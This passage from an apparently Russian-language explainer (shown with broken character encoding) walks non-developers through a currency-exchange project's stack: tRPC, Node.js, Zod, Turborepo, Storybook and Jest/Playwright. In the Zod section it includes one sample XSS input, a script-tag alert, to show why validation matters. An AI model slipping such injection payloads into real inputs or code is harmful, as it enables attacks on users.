// –û–¥–∏–Ω –∫–ª–∞—Å—Å - –≥–æ—Ç–æ–≤—ã–π —Å—Ç–∏–ª—å
<button className="bg-blue-500 text-white px-6 py-3 rounded-lg font-semibold hover:bg-blue-600 transition-colors">
  –û–±–º–µ–Ω—è—Ç—å
</button>
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –ù—É–∂–Ω–æ –±—ã—Å—Ç—Ä–æ —Å–æ–∑–¥–∞–≤–∞—Ç—å –∫—Ä–∞—Å–∏–≤—ã–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å. Tailwind –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–µ —Ç—Ä–∞—Ç–∏—Ç—å –≤—Ä–µ–º—è –Ω–∞ –Ω–∞–ø–∏—Å–∞–Ω–∏–µ CSS.

---

### üîß **Backend (—á—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ)**

#### **tRPC** - –°–≤—è–∑—å —Ñ—Ä–æ–Ω—Ç–∞ —Å –±—ç–∫–æ–º

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ —Ç–µ–ª–µ—Ñ–æ–Ω –º–µ–∂–¥—É –∫–ª–∏–µ–Ω—Ç–æ–º –∏ –∫—É—Ö–Ω–µ–π –≤ —Ä–µ—Å—Ç–æ—Ä–∞–Ω–µ, –Ω–æ —Å –∞–≤—Ç–æ–ø–µ—Ä–µ–≤–æ–¥—á–∏–∫–æ–º
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: –í–º–µ—Å—Ç–æ –∫—Ä–∏–∫–æ–≤ —á–µ—Ä–µ–∑ —Å—Ç–µ–Ω—É, –µ—Å—Ç—å –ø—Ä—è–º–∞—è —Å–≤—è–∑—å —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –ø—Ä–æ–≤–µ—Ä–∫–æ–π —á—Ç–æ –∑–∞–∫–∞–∑ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–æ–Ω—è—Ç

**–ü—Ä–æ–±–ª–µ–º–∞ –æ–±—ã—á–Ω—ã—Ö API:**

```javascript
// Frontend –Ω–µ –∑–Ω–∞–µ—Ç —á—Ç–æ –æ–∂–∏–¥–∞—Ç—å –æ—Ç API
const response = await fetch('/api/create-order', {
  method: 'POST',
  body: JSON.stringify({
    amount: 100,
    currency: 'BTC',
  }),
});

const result = await response.json();
// –ß—Ç–æ –≤ result? –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ!
// result.orderId –º–æ–∂–µ—Ç –Ω–µ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞—Ç—å
// result.amount –º–æ–∂–µ—Ç –±—ã—Ç—å —Å—Ç—Ä–æ–∫–æ–π –≤–º–µ—Å—Ç–æ —á–∏—Å–ª–∞
```

**–†–µ—à–µ–Ω–∏–µ tRPC:**

```typescript
// –ü–æ–ª–Ω–∞—è —Ç–∏–ø–∏–∑–∞—Ü–∏—è –∏ –≤–∞–ª–∏–¥–∞—Ü–∏—è
const createOrder = api.exchange.createOrder.useMutation();

// TypeScript –∑–Ω–∞–µ—Ç –≤—Å–µ —Ç–∏–ø—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏!
createOrder.mutate(
  {
    amount: 100, // –¢–æ–ª—å–∫–æ —á–∏—Å–ª–æ
    currency: 'BTC', // –¢–æ–ª—å–∫–æ –≤–∞–ª–∏–¥–Ω—ã–µ –≤–∞–ª—é—Ç—ã
  },
  {
    onSuccess: result => {
      // result –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω
      console.log(result.orderId); // ‚úÖ TypeScript –∑–Ω–∞–µ—Ç —á—Ç–æ —ç—Ç–æ string
      console.log(result.amount); // ‚úÖ TypeScript –∑–Ω–∞–µ—Ç —á—Ç–æ —ç—Ç–æ number
    },
  }
);
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –ö—Ä–∏—Ç–∏—á–Ω–æ —á—Ç–æ–±—ã –∫–ª–∏–µ–Ω—Ç –∏ —Å–µ—Ä–≤–µ—Ä —Ç–æ—á–Ω–æ –ø–æ–Ω–∏–º–∞–ª–∏ –¥—Ä—É–≥ –¥—Ä—É–≥–∞. –û—à–∏–±–∫–∞ –≤ –∫—É—Ä—Å–µ –∏–ª–∏ —Å—É–º–º–µ = –ø–æ—Ç–µ—Ä—è –¥–µ–Ω–µ–≥.

---

#### **Node.js** - –°–µ—Ä–≤–µ—Ä–Ω–∞—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –¥–≤–∏–≥–∞—Ç–µ–ª—å –∞–≤—Ç–æ–º–æ–±–∏–ª—è, –∫–æ—Ç–æ—Ä—ã–π –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –≤–µ—Å—å —Å–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞—Ç—å
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: JavaScript –∏–∑–Ω–∞—á–∞–ª—å–Ω–æ —Ä–∞–±–æ—Ç–∞–ª —Ç–æ–ª—å–∫–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ, Node.js –ø–æ–∑–≤–æ–ª–∏–ª –µ–º—É —Ä–∞–±–æ—Ç–∞—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ

**–ß—Ç–æ —ç—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç:**

- –û–¥–∏–Ω —è–∑—ã–∫ (JavaScript/TypeScript) –¥–ª—è —Ñ—Ä–æ–Ω—Ç–∞ –∏ –±—ç–∫–∞
- –ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ç–µ –∂–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
- –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –Ω–µ –ø–µ—Ä–µ–∫–ª—é—á–∞—é—Ç—Å—è –º–µ–∂–¥—É —è–∑—ã–∫–∞–º–∏

**–ü—Ä–∏–º–µ—Ä —Å–µ—Ä–≤–µ—Ä–Ω–æ–≥–æ –∫–æ–¥–∞:**

```typescript
// –≠—Ç–æ—Ç –∫–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –Ω–æ –ø–∏—à–µ—Ç—Å—è –∫–∞–∫ –æ–±—ã—á–Ω—ã–π JS/TS
export const exchangeRouter = t.router({
  createOrder: t.procedure
    .input(
      z.object({
        amount: z.number(),
        fromCurrency: z.string(),
        toCurrency: z.string(),
      })
    )
    .mutation(async ({ input }) => {
      // –õ–æ–≥–∏–∫–∞ –æ–±–º–µ–Ω–∞ –≤–∞–ª—é—Ç
      const rate = await getCurrentRate(input.fromCurrency, input.toCurrency);
      const order = await createExchangeOrder({
        ...input,
        rate,
      });

      return order;
    }),
});
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –ï–¥–∏–Ω—ã–π —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏—á–µ—Å–∫–∏–π —Å—Ç–µ–∫ —É–ø—Ä–æ—â–∞–µ—Ç —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É. –ú–µ–Ω—å—à–µ —Ä–∞–∑–Ω—ã—Ö —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–π = –º–µ–Ω—å—à–µ –º–µ—Å—Ç–∞ –¥–ª—è –æ—à–∏–±–æ–∫.

---

#### **Zod** - –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ —Å–ª—É–∂–±–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤ –∞—ç—Ä–æ–ø–æ—Ä—Ç—É –¥–ª—è –¥–∞–Ω–Ω—ã—Ö
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: –ü—Ä–æ–≤–µ—Ä—è–µ—Ç —á—Ç–æ –¥–∞–Ω–Ω—ã–µ –∏–º–µ—é—Ç –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π "–ø–∞—Å–ø–æ—Ä—Ç" –∏ –Ω–µ —Å–æ–¥–µ—Ä–∂–∞—Ç "–∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–æ–≤"

**–ë–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–∞–Ω–Ω—ã—Ö:**

```javascript
// –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç:
const userInput = {
  amount: "100<script>alert('hack')</script>", // XSS –∞—Ç–∞–∫–∞!
  currency: 'INVALID_CURRENCY', // –ù–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∞—è –≤–∞–ª—é—Ç–∞
  email: 'not-an-email', // –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π email
};

// –ö–æ–¥ —Å–ª–æ–º–∞–µ—Ç—Å—è –∏–ª–∏ –±—É–¥–µ—Ç –∞—Ç–∞–∫–æ–≤–∞–Ω
```

**–° Zod –≤–∞–ª–∏–¥–∞—Ü–∏–µ–π:**

```typescript
const exchangeSchema = z.object({
  amount: z.number().positive('–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π').max(1000000, '–ü—Ä–µ–≤—ã—à–µ–Ω –ª–∏–º–∏—Ç'),
  currency: z.enum(['BTC', 'ETH', 'USDT'], {
    errorMap: () => ({ message: '–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º–∞—è –≤–∞–ª—é—Ç–∞' }),
  }),
  email: z.string().email('–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π email').transform(sanitizeEmail), // –û—á–∏—Å—Ç–∫–∞ –æ—Ç XSS
});

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞
const result = exchangeSchema.safeParse(userInput);
if (!result.success) {
  // –ü–æ–∫–∞–∑–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –ø–æ–Ω—è—Ç–Ω—ã–µ –æ—à–∏–±–∫–∏
  return { errors: result.error.flatten() };
}

// –î–∞–Ω–Ω—ã–µ –≥–∞—Ä–∞–Ω—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ –±–µ–∑–æ–ø–∞—Å–Ω—ã –∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ã
const safeData = result.data;
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∫—Ä–∏—Ç–∏—á–Ω–∞. –û–¥–∏–Ω –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –≤–≤–æ–¥ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –ø–æ—Ç–µ—Ä–µ –¥–µ–Ω–µ–≥ –∏–ª–∏ –≤–∑–ª–æ–º—É —Å–∏—Å—Ç–µ–º—ã.

---

### üì¶ **–ò–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∞ (–∫–∞–∫ –≤—Å–µ –æ—Ä–≥–∞–Ω–∏–∑–æ–≤–∞–Ω–æ)**

#### **Turborepo** - –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–æ–ª—å—à–∏–º –ø—Ä–æ–µ–∫—Ç–æ–º

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –ø—Ä–æ—Ä–∞–± –Ω–∞ —Å—Ç—Ä–æ–π–∫–µ, –∫–æ—Ç–æ—Ä—ã–π –∫–æ–æ—Ä–¥–∏–Ω–∏—Ä—É–µ—Ç –≤—Å–µ –±—Ä–∏–≥–∞–¥—ã
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: –í–º–µ—Å—Ç–æ —Ö–∞–æ—Å–∞ –≥–¥–µ –∫–∞–∂–¥—ã–π –¥–µ–ª–∞–µ—Ç —á—Ç–æ —Ö–æ—á–µ—Ç, –µ—Å—Ç—å —á–µ—Ç–∫–∏–π –ø–ª–∞–Ω –∫—Ç–æ —á—Ç–æ —Å—Ç—Ä–æ–∏—Ç

**–ü—Ä–æ–±–ª–µ–º–∞ –±–æ–ª—å—à–∏—Ö –ø—Ä–æ–µ–∫—Ç–æ–≤:**

```
project/
  admin-panel/     ‚Üê –°–≤–æ—è –≤–µ—Ä—Å–∏—è React, —Å–≤–æ—è –≤–µ—Ä—Å–∏—è –∫–Ω–æ–ø–æ–∫
  main-website/    ‚Üê –î—Ä—É–≥–∞—è –≤–µ—Ä—Å–∏—è React, –¥—Ä—É–≥–∏–µ –∫–Ω–æ–ø–∫–∏
  mobile-app/      ‚Üê –¢—Ä–µ—Ç—å—è –≤–µ—Ä—Å–∏—è –≤—Å–µ–≥–æ

  ‚Üí –ö–∞–∂–¥–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥—É–±–ª–∏—Ä—É–µ—Ç –∫–æ–¥
  ‚Üí –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–≥–∞ –Ω—É–∂–Ω–æ –¥–µ–ª–∞—Ç—å –≤ 3 –º–µ—Å—Ç–∞—Ö
  ‚Üí –†–∞–∑–Ω—ã–µ –≤–µ—Ä—Å–∏–∏ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
```

**–†–µ—à–µ–Ω–∏–µ Turborepo:**

```
project/
  packages/
    ui/             ‚Üê –û–¥–Ω–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –¥–ª—è –≤—Å–µ—Ö
    utils/          ‚Üê –û–¥–Ω–∏ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –≤—Å–µ—Ö
    constants/      ‚Üê –û–¥–Ω–∏ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã –¥–ª—è –≤—Å–µ—Ö
  apps/
    admin-panel/    ‚Üê –ò—Å–ø–æ–ª—å–∑—É–µ—Ç packages
    main-website/   ‚Üê –ò—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–µ –∂–µ packages
    mobile-app/     ‚Üê –ò—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–µ –∂–µ packages

  ‚Üí –û–¥–∏–Ω –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤–µ–∑–¥–µ
  ‚Üí –ò—Å–ø—Ä–∞–≤–∏–ª –±–∞–≥ –≤ –æ–¥–Ω–æ–º –º–µ—Å—Ç–µ - –∏—Å–ø—Ä–∞–≤–∏–ª—Å—è –≤–µ–∑–¥–µ
  ‚Üí –û–¥–∏–Ω–∞–∫–æ–≤—ã–µ –≤–µ—Ä—Å–∏–∏ –≤—Å–µ–≥–æ
```

**–ö–æ–º–∞–Ω–¥—ã Turborepo:**

```bash
# –°–æ–±—Ä–∞—Ç—å –≤—Å–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ (–±—ã—Å—Ç—Ä–æ!)
npm run build

# –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –≤—Å–µ—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π
npm run dev

# –¢–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑–º–µ–Ω–∏–≤—à–∏–µ—Å—è —á–∞—Å—Ç–∏
npm run test
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –ù—É–∂–Ω—ã —Ä–∞–∑–Ω—ã–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π, –∞–¥–º–∏–Ω—Å–∫–∏–π, –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è). Turborepo –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–µ –¥—É–±–ª–∏—Ä–æ–≤–∞—Ç—å –∫–æ–¥ –º–µ–∂–¥—É –Ω–∏–º–∏.

---

#### **Storybook** - –ö–∞—Ç–∞–ª–æ–≥ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –∫–∞—Ç–∞–ª–æ–≥ IKEA –¥–ª—è UI –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: –í–º–µ—Å—Ç–æ –ø–æ–∏—Å–∫–∞ –Ω—É–∂–Ω–æ–π –∫–Ω–æ–ø–∫–∏ –ø–æ –≤—Å–µ–º—É —Å–∞–π—Ç—É, –µ—Å—Ç—å –∫–∞—Ç–∞–ª–æ–≥ –≥–¥–µ –ø–æ–∫–∞–∑–∞–Ω—ã –≤—Å–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã

**–ß—Ç–æ –¥–∞–µ—Ç Storybook:**

```typescript
// –ö–æ–º–ø–æ–Ω–µ–Ω—Ç –∫–Ω–æ–ø–∫–∏ –æ–±–º–µ–Ω–∞
export default {
  title: 'Components/ExchangeButton',
  component: ExchangeButton
};

// –†–∞–∑–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã –∫–Ω–æ–ø–∫–∏ –≤ –∫–∞—Ç–∞–ª–æ–≥–µ
export const Default = () => <ExchangeButton>–û–±–º–µ–Ω—è—Ç—å</ExchangeButton>;
export const Loading = () => <ExchangeButton loading>–û–±–º–µ–Ω—è—é...</ExchangeButton>;
export const Disabled = () => <ExchangeButton disabled>–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ</ExchangeButton>;
export const WithIcon = () => <ExchangeButton icon="swap">–û–±–º–µ–Ω—è—Ç—å</ExchangeButton>;
```

**–†–µ–∑—É–ª—å—Ç–∞—Ç**: [http://localhost:6006](http://localhost:6006) - –∂–∏–≤–æ–π –∫–∞—Ç–∞–ª–æ–≥ –≤—Å–µ—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤

- –î–∏–∑–∞–π–Ω–µ—Ä—ã –≤–∏–¥—è—Ç –∫–∞–∫ –≤—ã–≥–ª—è–¥—è—Ç –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã
- –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –±—ã—Å—Ç—Ä–æ –Ω–∞—Ö–æ–¥—è—Ç –Ω—É–∂–Ω—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç
- QA —Ç–µ—Å—Ç–∏—Ä—É—é—Ç –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**: –ú–Ω–æ–≥–æ –ø–æ—Ö–æ–∂–∏—Ö –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤ (–∫–Ω–æ–ø–∫–∏ –≤–∞–ª—é—Ç, –ø–æ–ª—è –≤–≤–æ–¥–∞ —Å—É–º–º, —Å—Ç–∞—Ç—É—Å—ã –∑–∞–∫–∞–∑–æ–≤). Storybook –ø–æ–º–æ–≥–∞–µ—Ç –Ω–µ –ø—É—Ç–∞—Ç—å—Å—è.

---

#### **Jest/Playwright** - –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ

**–ü—Ä–æ—Å—Ç—ã–º–∏ —Å–ª–æ–≤–∞–º–∏**: –ö–∞–∫ –∫–æ–Ω—Ç—Ä–æ–ª—å –∫–∞—á–µ—Å—Ç–≤–∞ –Ω–∞ –∑–∞–≤–æ–¥–µ
**–û–±—ã—á–Ω–∞—è –∞–Ω–∞–ª–æ–≥–∏—è**: Jest –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –¥–µ—Ç–∞–ª–∏, Playwright –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –≥–æ—Ç–æ–≤–æ–µ –∏–∑–¥–µ–ª–∏–µ

**Jest - Unit —Ç–µ—Å—Ç—ã (–ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–µ—Ç–∞–ª–µ–π):**

```typescript
// –¢–µ—Å—Ç–∏—Ä—É–µ–º —Ñ—É–Ω–∫—Ü–∏—é —Ä–∞—Å—á–µ—Ç–∞ –æ–±–º–µ–Ω–∞
describe('calculateExchange', () => {
  it('–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Ä–∞—Å—Å—á–∏—Ç—ã–≤–∞–µ—Ç –æ–±–º–µ–Ω BTC –≤ USD', () => {
    const result = calculateExchange({
      amount: 1,
      fromCurrency: 'BTC',
      toCurrency: 'USD',
      rate: 45000,
    });

    expect(result.toAmount).toBe(45000);
    expect(result.fee).toBe(450); // 1% –∫–æ–º–∏—Å—Å–∏—è
  });

  it('–≤—ã–±—Ä–∞—Å—ã–≤–∞–µ—Ç –æ—à–∏–±–∫—É –ø—Ä–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö', () => {
    expect(() =>
      calculateExchange({
        amount: -1, // –û—Ç—Ä–∏—Ü–∞—Ç–µ–ª—å–Ω–∞—è —Å—É–º–º–∞
        fromCurrency: 'BTC',
        toCurrency: 'USD',
        rate: 45000,
      })
    ).toThrow('–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω–æ–π');
  });
});
```

**Playwright - E2E —Ç–µ—Å—Ç—ã (–ø—Ä–æ–≤–µ—Ä–∫–∞ –≥–æ—Ç–æ–≤–æ–≥–æ –∏–∑–¥–µ–ª–∏—è):**

```typescript
// –¢–µ—Å—Ç–∏—Ä—É–µ–º –≤–µ—Å—å –ø—Ä–æ—Ü–µ—Å—Å –æ–±–º–µ–Ω–∞
test('–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç —Å–æ–∑–¥–∞—Ç—å –∑–∞–∫–∞–∑ –Ω–∞ –æ–±–º–µ–Ω', async ({ page }) => {
  await page.goto('/exchange');

  // –í–≤–æ–¥–∏–º –¥–∞–Ω–Ω—ã–µ
  await page.fill('[data-testid="amount"]', '100');
  await page.selectOption('[data-testid="from-currency"]', 'BTC');
  await page.selectOption('[data-testid="to-currency"]', 'USD');
  await page.fill('[data-testid="wallet"]', 'valid-wallet-address');

  // –ù–∞–∂–∏–º–∞–µ–º –æ–±–º–µ–Ω—è—Ç—å
  await page.click('[data-testid="exchange-button"]');

  // –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –∑–∞–∫–∞–∑ —Å–æ–∑–¥–∞–ª—Å—è
  await expect(page.locator('[data-testid="order-id"]')).toBeVisible();
  await expect(page.locator('text=–ó–∞–∫–∞–∑ —Å–æ–∑–¥–∞–Ω —É—Å–ø–µ—à–Ω–æ')).toBeVisible();
});
```

**–ó–∞—á–µ–º –≤ –æ–±–º–µ–Ω–µ –≤–∞–ª—é—Ç**:

- **Jest**: –ü—Ä–æ–≤–µ—Ä—è–µ—Ç —á—Ç–æ –º–∞—Ç–µ–º–∞—Ç–∏–∫–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–∞—è (–∫—É—Ä—Å—ã, –∫–æ–º–∏—Å—Å–∏–∏, —Ä–∞—Å—á–µ—Ç—ã)
- **Playwright**: –ü—Ä–æ–≤–µ—Ä—è–µ—Ç —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –º–æ–∂–µ—Ç —Ä–µ–∞–ª—å–Ω–æ –æ–±–º–µ–Ω—è—Ç—å –≤–∞–ª—é—Ç—É

---

## üîó **–ö–ê–ö –í–°–ï –¢–ï–•–ù–û–õ–û–ì–ò–ò –†–ê–ë–û–¢–ê–Æ–¢ –í–ú–ï–°–¢–ï**

–ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ —Å–æ–∑–¥–∞–Ω–∏–µ –∑–∞–∫–∞–∑–∞ –Ω–∞ –æ–±–º–µ–Ω –≤–∞–ª—é—Ç—ã:

1. **React** - –°–æ–∑–¥–∞–µ—Ç —Ñ–æ—Ä–º—É –≥–¥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ–¥–∏—Ç –¥–∞–Ω–Ω—ã–µ
2. **TypeScript** - –ü—Ä–æ–≤–µ—Ä—è–µ—Ç —á—Ç–æ –∫–æ–¥ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –Ω–∞ —ç—Ç–∞–ø–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏
3. **Zod** - –ü—Ä–æ–≤–µ—Ä—è–µ—Ç —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
4. **tRPC** - –ë–µ–∑–æ–ø–∞—Å–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π —Ç–∏–ø–∏–∑–∞—Ü–∏–µ–π
5. **Node.js** - –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –∑–∞–ø—Ä–æ—Å –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
6. **Next.js** - –ö–æ–æ—Ä–¥–∏–Ω–∏—Ä—É–µ—Ç —Ñ—Ä–æ–Ω—Ç –∏ –±—ç–∫, –æ–ø—Ç–∏–º–∏–∑–∏—Ä—É–µ—Ç –∑–∞–≥—Ä—É–∑–∫—É
7. **Tailwind** - –î–µ–ª–∞–µ—Ç —Ñ–æ—Ä–º—É –∫—Ä–∞—Å–∏–≤–æ–π
8. **Turborepo** - –ü–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ–∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –≤ —Ä–∞–∑–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö
9. **Jest/Playwright** - –ü—Ä–æ–≤–µ—Ä—è—é—Ç —á—Ç–æ –≤—Å–µ —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—Ä–∞–≤–∏–ª—å–Ω–æ

**–†–µ–∑—É–ª—å—Ç–∞—Ç**: –ë—ã—Å—Ç—Ä—ã–π, –±–µ–∑–æ–ø–∞—Å–Ω—ã–π, —Ç–∏–ø–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –æ–±–º–µ–Ω –≤–∞–ª—é—Ç —Å –∫—Ä–∞—Å–∏–≤—ã–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º.

---

---

## üìÇ **–ù–ê–í–ò–ì–ê–¶–ò–Ø –ü–û –ü–†–û–ï–ö–¢–£**

### **–ö–æ–≥–¥–∞ AI –≥–æ–≤–æ—Ä–∏—Ç: "–î–æ–±–∞–≤–ª—é –∫–æ–Ω—Å—Ç–∞–Ω—Ç—É"**

üîç **–ò—â–∏—Ç–µ –≤**: `packages/constants/src/`
üìù **–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç**: –î–æ–±–∞–≤–ª—è–µ—Ç—Å—è –≤ —Ü–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ –º–µ—Å—Ç–æ, —á—Ç–æ–±—ã –≤—Å–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –º–æ–≥–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å

### **–ö–æ–≥–¥–∞ AI –≥–æ–≤–æ—Ä–∏—Ç: "–°–æ–∑–¥–∞–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç"**

üîç **–ò—â–∏—Ç–µ –≤**: `packages/ui/src/components/`
